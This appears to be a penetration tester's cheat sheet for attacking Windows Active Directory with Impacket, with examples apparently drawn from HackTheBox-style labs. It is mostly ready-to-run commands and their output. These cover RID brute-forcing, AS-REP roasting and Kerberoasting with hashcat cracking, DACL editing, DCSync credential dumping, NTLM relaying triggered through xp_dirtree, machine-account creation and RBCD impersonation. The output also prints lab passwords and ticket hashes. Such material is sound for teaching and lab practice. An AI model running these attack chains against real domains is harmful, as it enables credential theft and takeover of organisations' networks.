## # `Impacket` -

Download [Impacket](https://github.com/ShutdownRepo/impacket) 
Download [Impacket](https://github.com/SecureAuthCorp/impacket)

Windows AD  Exploitation from Linux

## # `lookupsid.py` -

==List Domain Users== by bruteforcing Windows user security identifiers (SIDs) by incrementing the relative identifier (RID) part-

```bash
root@napster:~/Documents/HTB/Heist# lookupsid.py hazard:stealth1agent@10.10.10.149
Impacket v0.9.22.dev1+20200909.150738.15f3df26 - Copyright 2020 SecureAuth Corporation

[*] Brute forcing SIDs at 10.10.10.149
[*] StringBinding ncacn_np:10.10.10.149[\pipe\lsarpc]
[*] Domain SID is: S-1-5-21-4254423774-1266059056-3197185112
500: SUPPORTDESK\Administrator (SidTypeUser)
501: SUPPORTDESK\Guest (SidTypeUser)
```

```bash
lookupsid.py flight.htb/svc_apache:'S@Ss!K@*t13'@flight.htb
```

==Without Password== :

```bash
root@napster:~/Documents/HTB/Heist# lookupsid.py napster@manager.htb -no-pass
```

By default, typical RID cycle attacks go up to RID 4000.For a larger domain, it may be necessary to expand that :

```bash
oxdf@hacky$ lookupsid.py -no-pass 'guest@rebound.htb' 20000
Impacket v0.10.1.dev1+20230608.100331.efc6a1c3 - Copyright 2022 Fortra

[*] Brute forcing SIDs at rebound.htb
[*] StringBinding ncacn_np:rebound.htb[\pipe\lsarpc]
[*] Domain SID is: S-1-5-21-4078382237-1492182817-2568127209
498: rebound\Enterprise Read-only Domain Controllers (SidTypeGroup)
500: rebound\Administrator (SidTypeUser)
501: rebound\Guest (SidTypeUser)
502: rebound\krbtgt (SidTypeUser)
512: rebound\Domain Admins (SidTypeGroup)
513: rebound\Domain Users (SidTypeGroup)
```

Bash Ninja -

```bash
root@napster:~/Documents/HTB/Heist$ lookupsid.py flight.htb/svc_apache:'S@Ss!K@*t13'@flight.htb | grep SidTypeUser | cut -d' ' -f 2 | cut -d'\' -f 2 | tee users
```

```bash
root@napster:~/Documents/HTB/Heist$ lookupsid.py napster@manager.htb -no-pass | grep SidTypeUser | cut -d' ' -f2 | cut -d'\' -f2 | tr '[:upper:]' '[:lower:]' | tee users
```

You can also use `netexec` :

```bash
root@napster:~/Documents/HTB/Heist$ netexec smb 10.10.11.236 -u guest -p '' --rid-brute
```

## # `GetADUser.py` -

Use the `GetADUser.py` from [Impacket](https://github.com/SecureAuthCorp/impacket) script to list all the users :

```bash
alabaster@ssh-server-vm:~$ GetADUsers.py 'northpole.local/elfy:J4`ufC49/J4766' -dc-ip 10.0.0.53 -all
Impacket v0.11.0 - Copyright 2023 Fortra

[*] Querying 10.0.0.53 for information about domain.
Name                  Email                           PasswordLastSet      LastLogon
--------------------  ------------------------------  -------------------  -------------------
alabaster                                             2023-12-25 17:04:11.253583  2023-12-26 12:40:16.002390
Guest                                                 <never>              <never>
krbtgt                                                2023-12-26 01:12:37.762135  <never>
elfy                                                  2023-12-26 01:15:09.972232  2023-12-26 17:38:32.734116
wombleycube                                           2023-12-26 01:15:10.081640  2023-12-26 17:42:37.934752
```

## # `GetNPUsers.py [AS-Rep-Roast]` -

[GetNPUsers.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetNPUsers.py) can be used to retrieve domain users who have "==Do not require Kerberos preauthentication==" set and ask for their TGTs without knowing their passwords. It is then possible to attempt to crack the session key sent along the ticket to retrieve the user password. This attack is known as [ASREProast](https://www.thehacker.recipes/ad/movement/kerberos/asreproast).

```bash
oxdf@hacky$ GetNPUsers.py -usersfile users rebound.htb/ -dc-ip 10.10.11.231
Impacket v0.10.1.dev1+20230608.100331.efc6a1c3 - Copyright 2022 Fortra

[-] User Administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Guest doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] User DC01$ doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User ppaul doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User llune doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User fflock doesn't have UF_DONT_REQUIRE_PREAUTH set
$krb5asrep$23$jjones@REBOUND.HTB:125dac0dde12af5ecf9dc6d2cc15154a$7583e1f172d0af5550aabcb7e7630dc51722f46f656432714539a71a205fc4fe075267edd5ab35d36cf6204834cefb35afffb668f657a39baa4b627eb03bb98db77eacb3a17e950abd1d1d9bcb21872bb64b73d96eb52b4a2a5d9335a615e98b8f932b37df294f74de68eab318a048a2715585fddbcc4d691d52aa2b36cb1f268c21a4c7f4578f5e0317108dd5ed7133d3dbf1ba0f9c4949cb2371509afd9542554e9d71c9618fd0235f5e18d8b9fe2b46b2125d6f1946fdfb54a2cde72d910da0c90e11ac7cff1696d95defa9c9c0b6680f7d5cb65c5e77affa182a9cb2760efdd82c5ec065ca20005c
[-] User mmalone doesn't have UF_DONT_REQUIRE_PREAUTH set
```

Bruteforce password -

```bash
hashcat -m18200 output.txt wordlist
```

---

## # `GetUserSPNs.py [Kerberoast]` -

[GetUserSPNs.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetUserSPNs.py) can be used to ==obtain a password hash for user accounts that have an SPN== (service principal name). If an SPN is set on a user account it is possible to request a Service Ticket for this account and attempt to crack it in order to retrieve the user password.

```bash
GetUserSPNs.py -request -dc-ip 10.10.11.129 search.htb/hope.sharp -outputfile web_svc.hash
```

```bash
GetUserSPNs.py lab.enterprise.thm/nik:ToastyBoi! 
```

Using Kerberos for authentication :

```powershell
GetUserSPNs.py scrm.local/ksimpson:ksimpson -dc-host dc1.scrm.local -request -k
```

It is possible to abuse a user with `DONT_REQUIRE_PREAUTH` to Kerberoast other users. It's implemented in `GetUserSPNs.py` from [this commit](https://github.com/fortra/impacket/commit/c3ff33b39fe067e738d5625ce174d3d10f7a4b79).

Use the `-no-preauth` flag, giving it the account that does not require preauth, example jjones, as well as the `-usersfile`, the `-dc-host`, and the domain :

```bash
oxdf@hacky$ GetUserSPNs.py -no-preauth jjones -usersfile users -dc-host 10.10.11.231 rebound.htb/
Impacket v0.12.0.dev1+20240308.164415.4a62f39 - Copyright 2023 Fortra

[-] Principal: Administrator - Kerberos SessionError: KDC_ERR_S_PRINCIPAL_UNKNOWN(Server not found in Kerberos database)
[-] Principal: Guest - Kerberos SessionError: KDC_ERR_S_PRINCIPAL_UNKNOWN(Server not found in Kerberos database)
$krb5tgs$18$krbtgt$REBOUND.HTB$*krbtgt*$a67e8d44265a81ba334c0034$f608e248d49cb2399a7a51a7c1a41eb09d80197325b7afd754bb3afc853acc5c47bca2cf565473215e9e2a7b8385f86ada8f274cd935fadda9738bfaa295006b973b63fbec17326ee1a5afd89bc219a58183961c07f0a02f3de7c9d2111549366772d65ddb72970e7b204cc1a89f7fafe369a1ab7321fb10477a362f68caa9f3f27d3b32a4d6ad6de989f1c85040e7c22922a684efedb71ef057dcd73853f61fac0574663384130299be20782b5917dc2c0ad1628fe65c41cd75b9b2995b3f58a124a790c27e865f52ad74af1aeb089e44066b2f8d73762a18a9603f2fb820272e03b251a5d50528312379a2cd64f61be38fae4e1e999c22aec8b2851bb54cbb3f51183579d4a47fad128c74a99594d1b8f7ba8906a9bdbf9406231ec0f961978ee3380b0c3eaf960a593b690b5916719206db6c93e2f6a39d123d275b10ca4b621be7fbe4800ea9c82bab818bfa87fcb6a95d124457c6349c1c5c08808a6c9e22ad2adda1981becfa0d9c7637d5e43cfb5f2bac1ed4a52705bd3b9eb3163600e9f7d17a36beba8b0cf9fdd7b9cf63982e4612c74f663fc4cc350b789e40dd8562ca8d98ae6399371eeae64b4ae8e041027b126cf15079d161233db1776497a8415f48671e45d17ca67bde162bbb7a81c65fb71ed524fc85a37767b2db3a707b7246961b85d09f2bbfe49964d09347ce45a6666a6cd69d9344279c3067bd7ef20972940748d327be36983f5be0fc76fe48192eca457c7d006defdc67ed2f8bf44c42d113e25086bb23732ebdb4503e30b70aa9accc52163d9cdf8fe5a5a9bad7d80ec6c10801b2e763eb4f69ee33faaed68a8bf155ecd31ba39e12157f5ccf7a8804963f847a2e1ee5b389ad85ac6fa2d316c53b01769e4d26d2c349124c838757dfbfcc0462e46eaefa47c9d69dbd2d75ce0399da2d233f418e5ebfd52eb1b0626a471073b7db138c1f1e36fc10f694ab47d5615603389e1d79a159c54e58f55fae073e008a0d63a37e7810c4e65c450268ec75437116b315e31262eed219b6831b9b68f4b02b033a79b3952c25ed826251f4ba56bb61530fa1746486219be9fe038483c5f17564104246a8f64ce59d58222e1dae9ff22355cb5c8a46334d14ce80311a121b923ccaeadbbe48ac48cd3813a445a9179b5b3c0a28c5e60fb1e5d9728bb357caa5297efc8a3257553b181ef4af8094f6bcac3d0bc4a0844be32cbc26f2bede86a357db915dbbe10dfda9bc9c60aca39aaf5eadaf02858e2bb6f5e01d775d65f8812d50ea7a1e03e98952131727ade106b4c6d4f632fae036d9a58db5342134839bec68d1540920f11bb8fd13354fa4428cf8a6220ca5bde44d625aa0d90fe46494048cffd87af1eccf6914702222d75e1e5b264a07c3635b5f5cbc16e9de30b6e4743680c1e5d51a230eadd2eb67d9f3a4887eb127ab4a26ee54219c81c76d9b5773a8496ef8a441554d00db
[-] Principal: ppaul - Kerberos SessionError: KDC_ERR_S_PRINCIPAL_UNKNOWN(Server not found in Kerberos database)
[-] Principal: llune - Kerberos SessionError: KDC_ERR_S_PRINCIPAL_UNKNOWN(Server not found in Kerberos database)
[-] Principal: fflock - Kerberos SessionError: KDC_ERR_S_PRINCIPAL_UNKNOWN(Server not found in Kerberos database)
[-] Principal: jjones - Kerberos SessionError: KDC_ERR_S_PRINCIPAL_UNKNOWN(Server not found in Kerberos database)
[-] Principal: mmalone - Kerberos SessionError: KDC_ERR_S_PRINCIPAL_UNKNOWN(Server not found in Kerberos database)
[-] Principal: nnoon - Kerberos SessionError: KDC_ERR_S_PRINCIPAL_UNKNOWN(Server not found in Kerberos database)
$krb5tgs$23$*ldap_monitor$REBOUND.HTB$ldap_monitor*$4a3d9ed584d85f87798c0dc49faf1492$0ee39c5f7b34afa232310e71da3a8e73a587526e37d430f2dab38f3c592f5b3dd71a187c5f522fba0e7b3e5b8c34a4e3052a20c3ab89b411239310a1817b2fe3ccd57d9f61a6487bbfcd8820fd6818b1a64a8b9e96660a88010c8a7c008e488d77974aa671be1c546ed755aa4c1b4acfdb51b1dc2c0f3d1969e6fe2eec1ed1371037a0968753cabeed8567fa19defbf99a1ceccf5bb566be1bdcd8378e3f6ffd5160ec2cc8193e0fa5504a2410d43036cde56e37c678866772d34e6e293bf0da464637a791e0e78001274918c2382d4c95234c0d4bcef739964d14deedcc2924458f62765e1c45facee5a06fc63d75dd0c3d656ded2aa667a6dc6287df413a47606d58155bdfbe8b6bfffb78df7ff5df858c851a5042add02224f016ba3f13c3b72569a0bdae8df35ee373e436c96fde899d3792cbb0488fbe65aa5f667a5c29bab229e2f4626154b4bb64431ed3ad1ac27e5fdc3b34ccfbb4cce864c4b952b3c31e0ec339d3fa9ed4e5356118e77f62c21a433aa4c5e7246a6faa60b360e9ede6b5aed614814a9df10fb50ed93d50996fc25bd5c2ea5705639eb462110d53c1c76cdb343d94b38d032ab4add73831fe05d5d21b9f79cb8daa625a209b08ec56b25d22860fe186fee1d331a8e12047e4b12af254512bc384b64aa163f6730386bd90824c936d365c16549e928a5ca626c775d63257598270dad198b42b14327c4a1e8f36966d41d1b42dee824fc94e9191e78733a3c639b4bf6b2e103ec781f9241af24b95c0ba3cae55551391a94fd18ea5f70dc1935020357c4e7dade65d1e8be8c0e3833d8f559f5d51e7746c07ae6e4d3786b5e8c81e95da867457ae2d0267de8f446473a244d1116283805a1850a5d8125cc29b1bcfdb2362665effb1b77a95a7bd25d4fa7d68b2ca499ed77dd2b5fabca253650c34570e0ed9638ed354e4f70e68d498ef98be09a3ec20484c310128fd778f4e8255fc253a48c79c8d985923e4263deb4b6af680f83456ed4bb85b3944436a899347e8f4034f184d984ba50b36d70879d1414522fcb3811374552f58b6b42e1185ad10b397c1a1e3f8dffa566e6b744bb6e3df2e6025f709f6ba3cafe39313d23f14ee0828fb17105a8c05955574ef67bfe4a85b20f79ce81ae0345d43190100f61ecd20a2cede2d79d613eca3cb9fb020686dc16b4af6ca3b92a29db2fb5b481bb2c77b0199cacc5e814ac4da1e59dd91aa673a788cef94b07d76154970a39c35dd0015d983fa295c9224c67a9264a0274bafb2c40dd3915726b0050fd5f5bf12c0ba91d6b6164e1b3b5c4bb9fb5d21658e6550bc46f4b3b6c3fd99b6313e809708e7183454c30cb8d1101d
```

Bruteforce password -

```bash
hashcat -m 13100 web_svc.hash /usr/share/wordlists/rockyou.txt 
```

---

## # `dacledit.py` -

dacledit.py does the same thing that `Add-DomainObject Acl` (Powerview) does.

Clone [this repo](https://github.com/ShutdownRepo/impacket/tree/dacledit), checkout the `dacledit` branch, and install :

```bash
napster@hacky$ git clone https://github.com/ShutdownRepo/impacket.git impacket-dacl                                                  
Cloning into 'impacket-dacl'...
remote: Enumerating objects: 22819, done.
remote: Counting objects: 100% (12/12), done.
remote: Compressing objects: 100% (6/6), done.
remote: Total 22819 (delta 6), reused 9 (delta 6), pack-reused 22807
Receiving objects: 100% (22819/22819), 8.07 MiB | 39.92 MiB/s, done.
Resolving deltas: 100% (17414/17414), done.
napster@hacky$ cd impacket-dacl
napster@hacky$ pip install .
...[snip]...
```

Usuage -

```bash
napster@hacky$ dacledit.py -k 'absolute.htb/m.lovegod:AbsoluteLDAP2022!' -dc-ip dc.absolute.htb -principal m.lovegod -target "Network Audit" -action write -rights WriteMembers
Impacket v0.9.25.dev1+20221216.150032.204c5b6b - Copyright 2021 SecureAuth Corporation

[-] CCache file is not found. Skipping...
[*] DACL backed up to dacledit-20230523-004341.bak
[*] DACL modified successfully!
```

This is adding the `WriteMembers` permission to m.lovegod.

## # `getTGT.py` -

One way to get a local ticket using the hash is with `getTGT.py`. It takes the account and the credentials (password or hash) and talks to the DC to get a ticket that can be used to authenticate, saving that ticket in `administrator.ccache` :

```bash
nap@hacky$ getTGT.py -hashes :b3ff8d7532eef396a5347ed33933030f windcorp.htb/administrator
Impacket v0.10.1.dev1+20220720.103933.3c6713e - Copyright 2022 SecureAuth Corporation

[*] Saving ticket in administrator.ccache
```

## # `secretsdump.py` -

Impacket’s secretsdump.py will perform various techniques to dump secrets from the remote machine without executing any agent. Techniques include reading SAM and LSA secrets from registries, dumping NTLM hashes, plaintext credentials, and kerberos keys, and dumping NTDS.dit.

- <mark style="background: #3D7EFFA6;">DC Sync Attack</mark> :

secretsdump.py allows you to run DCSync attack from your Kali box, provided you can talk to the DC on TCP 445 and 135 and a high RPC port. This avoids fighting with AV, though it does create network traffic.

Give it just a target string in the format `[username]:[password]@[ip]` :

```bash
secretsdump.py 'svc_loanmgr:Moneymakestheworldgoround!@10.10.10.175'
```

```bash
secretsdump.py LICORDEBELLOTA.HTB/pivotapi\$@pivotapi.licordebellota.htb -dc-ip 10.10.10.240 -no-pass -k 
```

```bash
secretsdump.py -k -no-pass g0.flight.htb -just-dc-user administrator
```

```bash
secretsdump.py -k -no-pass g0.flight.htb
```

- <mark style="background: #3D7EFFA6;">Dump Hashes</mark> :

`secretsdump.py` will take the System hive and the `ntds.dit` file and dump that hashes -

```bash
secretsdump.py -system registry/SYSTEM -ntds Active\ Directory/ntds.dit LOCAL > backup_ad_dump
```

## # `reg.py` -

Impacket has a script, `reg.py`, which will do remote registery reads and can take a hash as auth :

```bash
nap@kali$ reg.py -hashes aad3b435b51404eeaad3b435b51404ee:e53d87d42adaa3ca32bdb34a876cbffb -dc-ip htb.local htb.local/henry.vinson@htb.local query -keyName HKU\\SOFTWARE
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[!] Cannot check RemoteRegistry status. Hoping it is started...
HKU\SOFTWARE
HKU\SOFTWARE\GiganticHostingManagementSystem
HKU\SOFTWARE\Microsoft
HKU\SOFTWARE\Policies
HKU\SOFTWARE\RegisteredApplications
HKU\SOFTWARE\VMware, Inc.
HKU\SOFTWARE\Wow6432Node
HKU\SOFTWARE\Classes

nap@kali$ reg.py -hashes aad3b435b51404eeaad3b435b51404ee:e53d87d42adaa3ca32bdb34a876cbffb -dc-ip htb.local htb.local/henry.vinson@htb.local query -keyName HKU\\SOFTWARE\\GiganticHostingManagementSystem
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[!] Cannot check RemoteRegistry status. Hoping it is started...
HKU\SOFTWARE\GiganticHostingManagementSystem
        UserName        REG_SZ   henry.vinson_adm
        PassWord        REG_SZ   G1#Ny5@2dvht
```

## # `ntlmrelayx.py` -

- You can perform Ntlm Relay Attack(that is forwarding the hash to authenticate) :

```bash
impacket-ntlmrelayx -tf targets.txt -socks -smb2support
```

targets.txt contains the Ip address you want access to.

For example, if we specify the target as _mssql://10.1.2.10:6969_, every time we get a victim connecting to our _Relay Servers_, _ntlmrelayx.py_ will relay the authentication data to the MSSQL service (port _6969_) at the target _10.1.2.10_.

- Wait for victim to authenticate -

```bash
exec xp_dirtree '\\10.8.0.36\share'
```

Every time authentication data is successfully relayed, you will get a message like:

```bash
[*] Authenticating against smb://192.168.48.38 as VULNERABLE\normaluser3 SUCCEED
[*] SOCKS: Adding VULNERABLE/NORMALUSER3@192.168.48.38(445) to active SOCKS connection. Enjoy
```

Impacket should have captured the hash and spawned a sock server and everything that you send through the sock server will be forwarded in the context of the user(MSSql).

- You can now use proxychains -

```bash
proxychains smbclient -L \\\\10.10.150.53 -U domainname/mssqlusername 
```

When using _proxychains_, be sure to configure it (configuration file located at _/etc/proxychains.conf_) pointing the host where _ntlmrealyx.py_ is running; the SOCKS port is the default one (_1080_). You should have something like this in your configuration file:

```bash
[ProxyList]
socks4 	192.168.48.1 1080
```

- At any moment, you can get a list of active sessions by typing _socks_ at the _ntlmrelayx.py_ prompt:

```bash
ntlmrelayx> socks
```

## # `addcomputer.py` -

You can add computer with `addcomputer.py` :

```bash
oxdf@hacky$ addcomputer.py 'authority.htb/svc_ldap:lDaP_1n_th3_cle4r!' -method LDAPS -computer-name 0xdf -computer-pass 0xdf0xdf0xdf -dc-ip 10.10.11.222
Impacket v0.10.1.dev1+20230608.100331.efc6a1c3 - Copyright 2022 Fortra

[*] Successfully added machine account 0xdf$ with password 0xdf0xdf0xdf.
```

Make sure you can add machine :

```bash
oxdf@hacky$ netexec ldap 10.10.11.222 -u svc_ldap -p 'lDaP_1n_th3_cle4r!' -M MAQ
SMB         10.10.11.222    445    AUTHORITY        [*] Windows 10.0 Build 17763 x64 (name:AUTHORITY) (domain:authority.htb) (signing:True) (SMBv1:False)
LDAPS       10.10.11.222    636    AUTHORITY        [+] authority.htb\svc_ldap:lDaP_1n_th3_cle4r!
MAQ         10.10.11.222    389    AUTHORITY        [*] Getting the MachineAccountQuota
MAQ         10.10.11.222    389    AUTHORITY        MachineAccountQuota: 10
```

## # `findDelegation.py` -

It can be used to find unconstrained, constrained (with or without protocol transition) and rbcd delegation :

```bash
oxdf@hacky$ findDelegation.py 'rebound.htb/delegator$' -dc-ip 10.10.11.231 -k -hashes :E1630B0E18242439A50E9D8B5F5B7524
Impacket v0.12.0.dev1+20240308.164415.4a62f39 - Copyright 2023 Fortra

[*] Getting machine hostname
[-] CCache file is not found. Skipping...
[-] CCache file is not found. Skipping...
AccountName  AccountType                          DelegationType  DelegationRightsTo    
-----------  -----------------------------------  --------------  ---------------------
delegator$   ms-DS-Group-Managed-Service-Account  Constrained     http/dc01.rebound.htb 
```

---

## # `rbcd.py/getST.py [RBCD]` -

If an account, having the capability to edit the `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute of another object (e.g. the `GenericWrite` ACE, see [Abusing ACLs](https://www.thehacker.recipes/a-d/movement/dacl)), is compromised, an attacker can use it populate that attribute, hence configuring that object for RBCD.

- Edit the target's "rbcd" attribute(rbcd.py) :

[Impacket](https://github.com/SecureAuthCorp/impacket/)'s [rbcd.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/rbcd.py) script (Python) can be used to read, write or clear the delegation rights, using the credentials of a domain user that has the needed permissions

```bash
oxdf@hacky$ rbcd.py 'rebound.htb/delegator$' -hashes :E1630B0E18242439A50E9D8B5F5B7524 -k -delegate-from ldap_monitor -delegate-to 'delegator$' -action write -dc-ip dc01.rebound.htb -use-ldaps
Impacket v0.12.0.dev1+20240308.164415.4a62f39 - Copyright 2023 Fortra

[-] CCache file is not found. Skipping...
[*] Attribute msDS-AllowedToActOnBehalfOfOtherIdentity is empty
[*] Delegation rights modified successfully!
[*] ldap_monitor can now impersonate users on delegator$ via S4U2Proxy
[*] Accounts allowed to act on behalf of other identity:
[*]     ldap_monitor   (S-1-5-21-4078382237-1492182817-2568127209-7681)
```

In the above ldap_monitor is set to trusted to delegate account for delegator$ using the `rbcd.py` script from Impacket.

- `rebound/delegator$` - The account to target. Will auth as this account to the DC.
- `-hashes :E1630B0E18242439A50E9D8B5F5B7524` - The hashes for this account to authenticate.
- `-k` - Use Kerberos authentication (it will use the hash to get a ticket).
- `-delegate-from ldap_monitor` - Set that `ldap_monitor` is allow to delegate.
- `delegate-to 'delegator$'` - Set the it is allow to delegate for delegator$.
- `-action write` - `write` is to set the value. Other choices for `-action` are `read`, `remove`, and `flush`.
- `-dc-ip dc01.rebound.htb` - Tell it where to find the DC.
- `-use-ldaps` - Fixes the binding issues.

We can cross check :

```bash
oxdf@hacky$ findDelegation.py 'rebound.htb/delegator$' -dc-ip 10.10.11.231 -k -hashes :E1630B0E18242439A50E9D8B5F5B7524
Impacket v0.12.0.dev1+20240308.164415.4a62f39 - Copyright 2023 Fortra

[*] Getting machine hostname
[-] CCache file is not found. Skipping...
[-] CCache file is not found. Skipping...
AccountName   AccountType                          DelegationType              DelegationRightsTo    
------------  -----------------------------------  --------------------------  ---------------------
ldap_monitor  Person                               Resource-Based Constrained  delegator$            
delegator$    ms-DS-Group-Managed-Service-Account  Constrained                 http/dc01.rebound.htb 
```

- Obtain a ticket (delegation operation) :

Once the attribute has been modified, the [Impacket](https://github.com/SecureAuthCorp/impacket) script [getST](https://github.com/SecureAuthCorp/impacket/blob/master/examples/getST.py) (Python) can then perform all the necessary steps to obtain the final "impersonating" ST 

```bash
oxdf@hacky$ getST.py 'rebound.htb/ldap_monitor:1GR8t@$$4u' -spn browser/dc01.rebound.htb -impersonate DC01$
Impacket v0.12.0.dev1+20240308.164415.4a62f39 - Copyright 2023 Fortra

[-] CCache file is not found. Skipping...
[*] Getting TGT for user
[*] Impersonating DC01$
[*] Requesting S4U2self
[*] Requesting S4U2Proxy
[*] Saving ticket in DC01$@browser_dc01.rebound.htb@REBOUND.HTB.ccache
```

